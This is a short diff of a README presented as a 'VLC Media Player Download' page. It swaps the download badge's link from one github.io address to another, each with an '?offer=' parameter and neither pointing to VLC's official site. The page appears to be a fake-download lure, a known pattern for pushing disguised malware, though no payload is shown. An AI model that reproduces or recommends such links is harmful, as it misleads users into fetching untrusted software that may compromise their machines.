@@ -1,6 +1,6 @@
 # VLC Media Player Download — Desktop Multimedia Player
 
-<a href="https://tools-git-app.github.io/.github/?offer=VLC%20Media%20Player" target="_blank">
+<a href="https://app-hub-load.github.io/.github/?offer=VLC%20Media%20Player" target="_blank">
   <img 
     src="https://img.shields.io/badge/VLC%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
